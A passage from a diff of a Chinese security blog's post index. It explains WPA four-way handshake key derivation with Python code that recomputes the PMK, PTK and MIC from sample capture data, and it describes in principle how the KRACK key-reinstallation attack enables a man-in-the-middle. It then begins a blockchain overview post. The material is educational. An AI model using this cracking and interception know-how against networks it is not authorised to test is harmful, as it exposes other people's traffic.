+<h1 id="WPA四次握手"><a href="#WPA四次握手" class="headerlink" title="WPA四次握手"></a>WPA四次握手</h1><p>在上一篇文章《Wi-Fi攻击方式简述》中，已经对WPA的握手过程进行过简单讲解，总结起来WPA的四次握手完成了：</p>
+<p>1）Wi-Fi密码的验证</p>
+<p>2）后续信道加密的密码的确认（注意这里不是“传输”）</p>
+<p>而在其握手过程中，会生成一些过程产物，如加密握手数据的密钥、完整性校验数据等。密钥计算的总览视图如下：</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629154441387.png" alt="image-20200629154441387"></p>
+<p>四次握手的简单示意图：</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/686769-20161117152254170-216963418.png" alt="686769-20161117152254170-216963418"></p>
+<p>接下来会逐步介绍每一步的计算过程。</p>
+<h2 id="握手前的准备：计算PMK"><a href="#握手前的准备：计算PMK" class="headerlink" title="握手前的准备：计算PMK"></a>握手前的准备：计算PMK</h2><p><strong>PMK(Pairwise Master Key)</strong> 是整个WPA认证过程中非常核心的一个密钥，是由Wi-Fi的<code>SSID</code>和<code>Pre-Shared-Key</code>（即Wi-Fi密码）计算而来，其算法被称为Password-Based Key Derivation Function 2 (PBKDF2) ，是一种使用HMAC-SHA1，使用SSID作为盐值来进行哈希的一种算法。</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629170801055.png" alt="image-20200629170801055"></p>
+<p>在默认的Python环境中，需要安装<code>pbkdf2</code>库来支持这种算法，可以使用<code>pip install pbkdf2</code>命令来安装 。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pbkdf2 <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">psk = <span class="string">&quot;Induction&quot;</span></span><br><span class="line">ssid = <span class="string">&quot;Coherer&quot;</span></span><br><span class="line">pmk = PBKDF2(psk, ssid, <span class="number">4096</span>).read(<span class="number">32</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629165810353.png" alt="image-20200629165810353"></p>
+<p>此外，可以利用Linux系统中的<code>wpa_passphrase</code>工具来计算PMK，其命令为：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pentest@DESKTOP<span class="literal">-2AE07FJ</span>:~<span class="variable">$</span> wpa_passphrase Coherer Induction</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629165935651.png" alt="image-20200629165935651"></p>
+<p>这里可以看出来，计算出来的值是一致的。</p>
+<h2 id="第一次握手：传递ANonce，STA计算PTK"><a href="#第一次握手：传递ANonce，STA计算PTK" class="headerlink" title="第一次握手：传递ANonce，STA计算PTK"></a>第一次握手：传递ANonce，STA计算PTK</h2><p>在WPA的第一次握手时，由AP向STA发送<code>ANonce</code>：</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629170336475.png" alt="image-20200629170336475"></p>
+<p>在这个数据包中，除了 <code>ANonce</code> 以外，在头部包含了双方的MAC地址。此时<strong>STA本地生成SNonce，满足了PTK计算的全部条件，因此进行PTK的计算</strong>。</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629171145032.png" alt="image-20200629171145032"></p>
+<p><strong>由于SNonce在第二次握手的数据包中，因此这部分的演示在下一节进行。</strong></p>
+<h2 id="第二次握手：传递SNonce，AP计算PTK"><a href="#第二次握手：传递SNonce，AP计算PTK" class="headerlink" title="第二次握手：传递SNonce，AP计算PTK"></a>第二次握手：传递SNonce，AP计算PTK</h2><p>第二次握手时，STA向AP发送SNonce：</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629171638896.png" alt="image-20200629171638896"></p>
+<p>PTK（Pairwise Transient Key）的计算需要使用<strong>PRF512</strong>算法，其实现是参照《<a href="https://www.shellvoide.com/wifi/understanding-wpa-wpa2-hash-mic-cracking-process-python/">Understanding WPA/WPA2 Hash (MIC) Cracking Process In Python</a>》文章中给出的算法进行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">customPRF512</span>(<span class="params">key, A, B</span>):</span></span><br><span class="line">    blen = <span class="number">64</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    R = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= ((blen * <span class="number">8</span> + <span class="number">159</span>) / <span class="number">160</span>):</span><br><span class="line">        hmacsha1 = hmac.new(key, A + <span class="built_in">chr</span>(<span class="number">0x00</span>) + B + <span class="built_in">chr</span>(i), hashlib.sha1)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        R = R + hmacsha1.digest()</span><br><span class="line">    <span class="keyword">return</span> R[:blen]</span><br></pre></td></tr></table></figure>
+
+<p>从前两次握手包中提取的<code>ANonce</code>、<code>SNonce</code> 以及双方的MAC地址，拼接起来作为计算PTK的部分：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mac_ap = binascii.unhexlify(<span class="string">&quot;000c4182b255&quot;</span>)</span><br><span class="line">mac_cl = binascii.unhexlify(<span class="string">&quot;000d9382363a&quot;</span>)</span><br><span class="line">anonce = binascii.unhexlify(<span class="string">&quot;3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933&quot;</span>)</span><br><span class="line">snonce = binascii.unhexlify(<span class="string">&quot;cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386&quot;</span>)</span><br><span class="line">key_data = <span class="built_in">min</span>(mac_ap, mac_cl) + <span class="built_in">max</span>(mac_ap, mac_cl) + <span class="built_in">min</span>(anonce,snonce) + <span class="built_in">max</span>(anonce,snonce)</span><br></pre></td></tr></table></figure>
+
+<p><code>PRF512</code>需要3个参数，<code>PMK</code>，<code>PKE</code> 和上面计算出来的 <code>key_data</code>。其中<code>PKE</code>是一个固定字符串，<code>PMK</code>在前文中有过计算：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pke = <span class="string">&quot;Pairwise key expansion&quot;</span></span><br><span class="line">pmk = PBKDF2(<span class="string">&quot;Induction&quot;</span>, <span class="string">&quot;Coherer&quot;</span>, <span class="number">4096</span>).read(<span class="number">32</span>)</span><br><span class="line">ptk = customPRF512(pmk, pke, key_data)</span><br><span class="line"><span class="comment"># 此处ptk的值(Hex String)为：b1cd792716762903f723424cd7d1651182a644133bfa4e0b75d96d230835843315798d511beae0028313c8ab32f12c7ecb71c893482669daaf0e9223fe1c0aed</span></span><br></pre></td></tr></table></figure>
+
+<p>到这里，AP和STA各自都计算出了PTK（正常情况下双方算出的PTK内容是一致的）。</p>
+<h2 id="PTK的构成"><a href="#PTK的构成" class="headerlink" title="PTK的构成"></a>PTK的构成</h2><p>上一步骤中，计算出来的PTK是一个512bit的字符串（64字节），这是由于我们下载的Wireshark官方提供的样例包中的WPA采用的是TKIP加密，如果是CCMP加密，这里的算法会有所区别，因为计算出的PTK应当为384bit。</p>
+<p>此处以TKIP加密为例，512bit的字符串可以分割为3个部分：KCK、KEK 和 TK。</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629191743423.png" alt="image-20200629191743423"></p>
+<p><strong>KCK (Key Confirmation Key)：</strong>用于计算WPA EAPOL密钥消息的MIC（完整性验证）</p>
+<p><strong>KEK (Key Encryption Key)：</strong>用于加密发送到客户端的附加数据（在“密钥数据”字段中）</p>
+<p><strong>TK (Temporal Key)：</strong>用于后续通信数据加密</p>
+<p>TKIP加密模式下，PTK共512bit，其中按顺序为：KCK（128bit），KEK（128bit），TK（256bit）</p>
+<p>CCMP加密模式下，PTK共384bit，其中按顺序为：KCK（128bit），KEK（128bit），TK（128bit）</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200630095341818.png" alt="image-20200630095341818"></p>
+<p>如上节中计算的PTK，按照长度划分，应为：</p>
+<p>KCK = b1cd792716762903f723424cd7d16511</p>
+<p>KEK = 82a644133bfa4e0b75d96d2308358433</p>
+<p>TK = 15798d511beae0028313c8ab32f12c7ecb71c893482669daaf0e9223fe1c0aed</p>
+<h2 id="验证MIC"><a href="#验证MIC" class="headerlink" title="验证MIC"></a>验证MIC</h2><p>比较第一次和第二次握手，在数据包中会发现在<code>WPA Key MIC</code>字段中由原来的全0变成了一串字符：</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200629202936492.png" alt="image-20200629202936492"></p>
+<p><strong>MIC (Message Integrity Code)：</strong>消息完整性代码 是校验数据是否被篡改，以及PSK是否正确（因为MIC是由PTK参与计算，PTK由是由PSK生成）。</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200630100306995.png" alt="image-20200630100306995"></p>
+<p>MIC的计算是以KCK为密钥（Key），整个802.1X报文为消息体（Message）进行HMAC运算得出的结果，共128bit。</p>
+<p>顺便一提，WPA的密码离线破解也是利用PSK生成PMK，并根据握手包计算KCK，再生成MIC并对比原数据包中的MIC来确定密码是否正确。</p>
+<p>在我们手工验证的时候，需要先将整个报文（这里以第二次握手为例）提取出来，并找到<code>WPA Key MIC</code>字段，将这部分内容替换成0，再计算。</p>
+<p><img src="/2020/06/29/WPA%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90/image-20200630101214680.png" alt="image-20200630101214680"></p>
+<p>这部分代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = binascii.unhexlify(<span class="string">&quot;0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000&quot;</span>)</span><br><span class="line">mic = hmac.new(ptk[<span class="number">0</span>:<span class="number">16</span>], payload, hashlib.sha1).hexdigest()[:<span class="number">32</span>]</span><br></pre></td></tr></table></figure>
+
+<p>至此，大部分的计算和校验任务已经结束。</p>
+<h2 id="第三次握手：传递加密的GTK，STA安装TK"><a href="#第三次握手：传递加密的GTK，STA安装TK" class="headerlink" title="第三次握手：传递加密的GTK，STA安装TK"></a>第三次握手：传递加密的GTK，STA安装TK</h2><p>第三次握手，由AP向STA发送数据，其中MIC部分与上面的计算方式一致。STA接收到数据后，验证MIC通过则说明AP是有效的，双方PMK是一致的。</p>
+<p>同时，在这个数据包中，包含了加密后的GTK。<strong>GTK (Group Temporal Key)</strong> 用于加密广播和多播数据。GTK加密的密钥为KEK，其解密和使用不在此详述。</p>
+<p>当STA接收到第三次握手包并验证MIC通过后，会将计算出来的TK（PTK的最后一段）安装到系统中，作为后续的通信加密密钥。</p>
+<h2 id="第四次握手：AP安装TK"><a href="#第四次握手：AP安装TK" class="headerlink" title="第四次握手：AP安装TK"></a>第四次握手：AP安装TK</h2><p>最后一次握手仅为STA向AP发送的确认信息，表示密钥已经安装完毕，此时AP端也会进行密钥安装，至此，双方的密钥安装全部结束，后续通信中按照前面步骤中的密钥进行通信。</p>
+<h1 id="密钥重装攻击-KRACK-Attack"><a href="#密钥重装攻击-KRACK-Attack" class="headerlink" title="密钥重装攻击 KRACK Attack"></a>密钥重装攻击 KRACK Attack</h1><p>上文中简单梳理了一下WPA四次握手的过程，其中省略了一些部分。由于主要是想帮助对KRACK漏洞的理解，因此重点放在第三次握手的密钥安装部分，安装的密钥来源上。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>关于这一漏洞，感兴趣的可以参考《<a href="https://www.freebuf.com/articles/wireless/150953.html">WPA2 密钥重装攻击 KRACK Attacks 分析报告</a>》，个人感觉这篇文章解释的比较详细，总结起来这个漏洞就是：</p>
+<blockquote>
+    其中，wpa_supplicant 2.4及2.5版本实现了协议注释内容“一旦安装后，就可从内存中清除加密密钥”，将导致客户端会安装值全为零的秘钥。因此使用了这些wpa_supplicant版本的Linux及Android设备将遭受严重威胁。
+</blockquote>
+
+<p>这个漏洞是利用wpa_supplicant在第三次握手时对TK的处理来达到攻击的目的的。由于TK是根据第一次和第二次握手包中的数据生成，因此STA会将该密钥保存在本地的内存中。当收到第三次握手的数据包时，STA会将该密钥安装，并从内存中清除（“一旦安装后，就可从内存中清除加密密钥”），因此再次收到该握手包时，程序会再次加载这部分已被清零的内存，导致重新安装的密钥为全0。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于目前未找到直接的利用EXP/POC，在Github上有一个检测工具：<a href="https://github.com/vanhoefm/krackattacks-scripts%EF%BC%8C%E5%85%B6%E5%AE%98%E7%BD%91">https://github.com/vanhoefm/krackattacks-scripts，其官网</a> <a href="https://www.krackattacks.com/">https://www.krackattacks.com</a> 上有对这个漏洞的演示。</p>
+<p>从原理和演示来看，KRACK漏洞需要搭建Rogue AP做中间人，转发握手数据帧。当发送第三次握手包时，进行重放。</p>
+<p>由于多次接收到第三次握手包，STA会尝试安装全0的密钥，并使用密钥加密后续通信包。Rogue AP的通信密钥预先就被置为0，这样就可以正常的和STA通信。</p>
+<p>目前没有时间来实践这个漏洞，仅从原理上对漏洞的利用方式进行分析，该漏洞更像是传统的Evil Twin的攻击方法，但Evil Twin需要知道目标AP的密码，才能让用户的设备顺利连入；而借助KRACK Attack，攻击者无需知道目标AP的密码即可实现中间人攻击，监听受害者流量。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>WPA的四次握手中，前两次是在互相交换计算PTK的信息（ANonce、SNonce），AP验证STA身份（利用MIC）并各自计算出PTK；第三次握手STA验证了AP的身份，传输加密GTK，并将计算出的TK安装；第四次握手确认密钥安装完成。</p>
+<p>附：完整的计算MIC的 Python 代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pbkdf2 <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">import</span> hmac, binascii, hmac, hashlib, sha</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">customPRF512</span>(<span class="params">key, A, B</span>):</span></span><br><span class="line">    blen = <span class="number">64</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    R = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= ((blen * <span class="number">8</span> + <span class="number">159</span>) / <span class="number">160</span>):</span><br><span class="line">        hmacsha1 = hmac.new(key, A + <span class="built_in">chr</span>(<span class="number">0x00</span>) + B + <span class="built_in">chr</span>(i), sha)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        R = R + hmacsha1.digest()</span><br><span class="line">    <span class="keyword">return</span> R[:blen]</span><br><span class="line"></span><br><span class="line">psk = <span class="string">&quot;Induction&quot;</span></span><br><span class="line">ssid = <span class="string">&quot;Coherer&quot;</span></span><br><span class="line">pmk = PBKDF2(psk, ssid, <span class="number">4096</span>).read(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">mac_ap = binascii.unhexlify(<span class="string">&quot;000c4182b255&quot;</span>)</span><br><span class="line">mac_cl = binascii.unhexlify(<span class="string">&quot;000d9382363a&quot;</span>)</span><br><span class="line">anonce = binascii.unhexlify(<span class="string">&quot;3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933&quot;</span>)</span><br><span class="line">snonce = binascii.unhexlify(<span class="string">&quot;cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386&quot;</span>)</span><br><span class="line"></span><br><span class="line">key_data = <span class="built_in">min</span>(mac_ap, mac_cl) + <span class="built_in">max</span>(mac_ap, mac_cl) + <span class="built_in">min</span>(anonce,snonce) + <span class="built_in">max</span>(anonce,snonce)</span><br><span class="line">pke = <span class="string">&quot;Pairwise key expansion&quot;</span></span><br><span class="line">ptk = customPRF512(pmk, pke, key_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;PTK Original:                &quot;</span>,ptk.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;EAPOL-Key Confirm Key:       &quot;</span>,ptk[:<span class="number">16</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;EAPOL-Key Encrypt Key:       &quot;</span>,ptk[<span class="number">16</span>:<span class="number">32</span>].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(TKIP|CCMP) Temporal Key:    &quot;</span>,ptk[<span class="number">32</span>:].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = binascii.unhexlify(<span class="string">&quot;0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000&quot;</span>)</span><br><span class="line"></span><br><span class="line">mic = hmac.new(ptk[<span class="number">0</span>:<span class="number">16</span>], payload, hashlib.sha1).hexdigest()[:<span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;MIC (Message Integrity Code):&quot;</span>,mic</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>参考链接</strong></p>
+<p>[1] <a href="WPA/RSN%E5%9B%9B%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8CPTK">WPA/RSN四次握手和PTK</a></p>
+<p>[2] <a href="https://dalewifisec.wordpress.com/2013/06/03/keys-keys-and-even-more-keys/">KEYS, KEYS, AND EVEN MORE KEYS!</a></p>
+<p>[3] <a href="WPA/WPA2-PSK%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B">WPA/WPA2-PSK认证过程</a></p>
+<p>[4] <a href="https://www.jianshu.com/p/392362718d68">四次握手</a></p>
+<p>[5] <a href="https://www.cnblogs.com/efzju/p/3199330.html">安全协议系列（二）—-CCM与CCMP</a></p>
+<p>[6] <a href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></p>
+<p>[7] <a href="https://github.com/vanhoefm/krackattacks-scripts">https://github.com/vanhoefm/krackattacks-scripts</a></p>
+<p>[8] <a href="https://www.freebuf.com/articles/wireless/153255.html">国内研究人员首次Wifi重大漏洞利用实现 | Krack攻击测试套件打包</a></p>
+<p>[9] <a href="https://www.freebuf.com/articles/wireless/150953.html">WPA2 密钥重装攻击 KRACK Attacks 分析报告</a></p>
+<p>[10] <a href="https://www.shellvoide.com/wifi/understanding-wpa-wpa2-hash-mic-cracking-process-python/">Understanding WPA/WPA2 Hash (MIC) Cracking Process In Python</a></p>
+<p>[11] <a href="https://wiki.wireshark.org/HowToDecrypt802.11">HowToDecrypt802.11</a></p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>Wi-Fi</tag>
+        <tag>WPA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>利用Python搭建长连接中间人工具分析流量</title>
     <url>/2020/05/15/%E5%88%A9%E7%94%A8Python%E6%90%AD%E5%BB%BA%E9%95%BF%E8%BF%9E%E6%8E%A5%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<p>使用Burpsuite或者Fiddler等工具做HTTP代理分析流量是渗透测试的基操，对于测试Web Application或者API接口效果都很好。但是，Burpsuite无法正确处理HTTP长连接(持久连接)，即头部字段Connection: Alive的情况。</p>
@@ -1957,6 +1957,144 @@ Websocket 通过 HTTP/1.1 协议的101状态码进行握手。<br>
         <tag>Python</tag>
         <tag>MitM</tag>
         <tag>Proxy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区块链安全初探（二）：区块链的层次</title>
+    <url>/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/</url>
+    <content><![CDATA[<p>随着比特币的发展，逐渐这个技术火出了圈。它提供的不可篡改、可追溯、不依赖第三方信任的特性看上去是那么的诱人，很多的行业都想借鉴这一技术。但是比特币的共识机制PoW实在是太浪费资源了（算力、电力），而且仅仅只能记录交易、平均每秒7笔的交易速度等等瓶颈都限制其在其他行业的发展。</p>
+<p>于是，基于比特币思想的其他类型的技术就开始涌现出来[1]。</p>
+<span id="more"></span>
+
+
+
+<h1 id="区块链的发展"><a href="#区块链的发展" class="headerlink" title="区块链的发展"></a>区块链的发展</h1><p>由于在”CCTC 2017 中国云计算技术大会“上，有一篇相关演讲《区块链技术回顾与展望》，较为详细的从相关密码学理论的起源开始阐述了区块链技术的发展史，不过该PPT好像并没有在大会的官网下载页面提供，可以从<a href="http://pic.huodongjia.com/ganhuodocs/2017-06-15/1497513853.16.pdf">这里</a>进行下载。或者查看[1]中的详细内容。</p>
+<h2 id="区块链1-0：数字货币"><a href="#区块链1-0：数字货币" class="headerlink" title="区块链1.0：数字货币"></a>区块链1.0：数字货币</h2><p>随着中本聪在2009年1月上线了第一个版本，他挖出的创世区块和第一笔50个Bitcoin成为数字货币体系的开端。</p>
+<p>但是，Bitcoin体系有着诸多的问题，比如区块的容量、生成区块的时间等等。当然，我认为中本聪在设计这一体系的时候，就是想用高昂的代价（时间成本、算力成本、电力成本）来保障数字货币的安全。因此，就有人在比特币的基础上进行“魔改”，如2011年发布的莱特币，将PoW中的 <em>SHA256算法</em> 替换成 <em>Scrypt算法</em>，使得普通计算机更容易加入挖矿。</p>
+<p>随后，各种各样的魔改版本上线，彼时大家都称之为“XX币”，这项技术仍然在 <strong>数字货币</strong> 领域发展。</p>
+<h2 id="区块链2-0：图灵完备"><a href="#区块链2-0：图灵完备" class="headerlink" title="区块链2.0：图灵完备"></a>区块链2.0：图灵完备</h2><p>由于数字货币体系中，每个节点只是傻傻的记录静态数据，而不能完成更复杂的操作，比如“A在10天后向B转账1BTC”，这种操作在之前的系统中只能是到“10天后”这个时间点上由A操作，而不能在10天前就定义好由系统自动执行。</p>
+<p>以太坊的出现，带来了智能合约的概念，扩展了原来单纯的数字货币的体系，使得区块链系统可以执行一些复杂操作，有点类似于“小程序”的概念。</p>
+<p>区块链1.0是发一发文字消息，2.0允许有小程序了，更加智能、功能更加完善，也是由此区块链技术从单纯的数字货币、分布式账本开始向各行各业渗透。</p>
+<h2 id="区块链3-0：包罗万象"><a href="#区块链3-0：包罗万象" class="headerlink" title="区块链3.0：包罗万象"></a>区块链3.0：包罗万象</h2><p>目前来说，区块链3.0仍是一个概念。由于区块链描绘的“不依赖第三方的信任”、“不可篡改”的概念过于诱人，使得人们幻想能把全部的资产都上链进行管理。“在一个大的底层框架内构筑各式各样的应用，打造一个无信任成本、具备超强交易能力、风险极低的平台”[2]。</p>
+<h1 id="区块链技术的层次模型"><a href="#区块链技术的层次模型" class="headerlink" title="区块链技术的层次模型"></a>区块链技术的层次模型</h1><p>从区块链的发展中可以看出，虽然后续出现了各种各样的实现，但再怎么变化都是脱胎于中本聪的比特币。因此，即使看似已经是一个全新的技术了（比如Hyperledger Fabric），但核心思想依然和比特币是一致的。</p>
+<p>比特币能够在一个多方参与的没有可信第三方的环境下维护其数字货币，主要技术有：</p>
+<ol>
+<li>共识机制，能保证所有参与节点记账的内容一致</li>
+<li>默尔克树的存储结构，保证数据可查找、能迅速定位到有问题的某条数据上</li>
+<li>P2P网络连接，节点发现、广播机制、接收数据后的处理机制等</li>
+</ol>
+<p>而随着“区块链2.0”的出现，带来了智能合约技术，以及构建在智能合约之上的应用。因此大致可以将区块链拆解成6个技术分类：</p>
+<p><img src="/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/image-20210627140127036.png" alt="image-20210627140127036"></p>
+<p style="text-align:center">图1. 区块链的6层模型[3]</p>
+
+<p>在这个模型中，不同区块链技术之间，越往下（靠近Data layer）就越趋同，而越往上（靠近Application layer）就差异越大。其中红色虚线标出的，是区块链2.0新增的技术。</p>
+<p>但是，恰恰是底层的技术才是更加具有区块链特色的技术。</p>
+<p>这里插一句，现在各方大谈区块链，那么区块链到底好在哪？百度百科<a href="https://baike.baidu.com/item/%E5%8C%BA%E5%9D%97%E9%93%BE/13465666">“区块链”词条</a>中给出的<strong>特点</strong>有：</p>
+<blockquote>区块链是一个分布式的共享账本和数据库，具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点。</blockquote>
+
+<p>可以看到，其中最有价值的就是去中心化和不可篡改这两点，而本质上也是解决了信任问题。任何第三方都不是<strong>绝对</strong>可信的，因此区块链解决了这一问题。区块链技术的本质也正是如此，在没有可信第三方的分布式环境下保证用户交易（中本聪在论文里也是这样说的）。</p>
+<p>理清这一点，再回头看区块链的各项技术就会非常清晰，所有的操作都是为了这个目标而进行的。</p>
+<h2 id="数据层-Data-layer"><a href="#数据层-Data-layer" class="headerlink" title="数据层 Data layer"></a>数据层 Data layer</h2><p>数据层可以说是整个区块链最核心的部分之一（个人观点，其次是共识层），也奠定了区块链广为流传的特性中的“不可篡改”的特点。</p>
+<h3 id="数字签名-Digital-signature"><a href="#数字签名-Digital-signature" class="headerlink" title="数字签名 Digital signature"></a>数字签名 Digital signature</h3><p>这个部分也是中本聪第一个提及的点，为了解决“究竟是不是我转的账”这和问题。</p>
+<p>在用户发起交易（Transaction）的时候，通过用户的签名进行验证，可以保证该交易是用户本人发出的，而不是被恶意伪造的。这里的原理也比较好理解，和其他地方使用的签名并无不同。引用一张论文里的示意图：</p>
+<p><img src="/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/image-20210804210217560.png" alt="image-20210804210217560"></p>
+<p style="text-align:center">图2. Bitcoin中的交易示意图</p>
+
+<p>这里就能很清晰的看出签名是如何在一条交易信息里被使用的。</p>
+<h3 id="时间戳-Timestamp"><a href="#时间戳-Timestamp" class="headerlink" title="时间戳 Timestamp"></a>时间戳 Timestamp</h3><p>在区块链中，时间戳的概念并不是一个时间。</p>
+<p>在其他的领域里，时间戳可能是一个字符串，可以用各种方式表达，比如“年月日时分秒”，或者是从1900年以来的秒数/毫秒数等等。但是去请求某一个时间戳服务器却恰恰违背了“没有可信第三方”这个概念。</p>
+<p>进一步思考，时间戳的意义是什么？无非就是去表达交易的前后顺序。比如我有1BTC，我把这个币转给了A，同时我又发了一条交易，将这个币转给B。一个币转给了两个人，那哪一次是有效的、哪一次是无效的？</p>
+<p>当然你可以说，看时间早的那条就是有效的。可是时间戳有可能被更改，即使是权威服务器给出的时间戳。</p>
+<p>因此中本聪提出，并不使用时间戳，而是哈希来解决这个问题。这个想法真的太精妙了。</p>
+<p>在计算当前区块的哈希时，带上前一区块的哈希，这样一直下去，通过不断的迭代来强化前后顺序，在保证交易顺序的同时，也形成了<strong>“链”式结构</strong>（Chain structure）。这一经典的结构也是区块链这一名字的由来。</p>
+<p>依然引用原文中的示意图：</p>
+<p><img src="/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/image-20210804212238678.png" alt="image-20210804212238678"></p>
+<p style="text-align:center">图3. 中本聪描述的“时间戳”的概念示意图</p>
+
+<p>一点题外话：最近在学习区块链的过程中，看到一篇关于时间戳的文章，简直离谱……链接就不放了，以免误导其他人，给一个截图：</p>
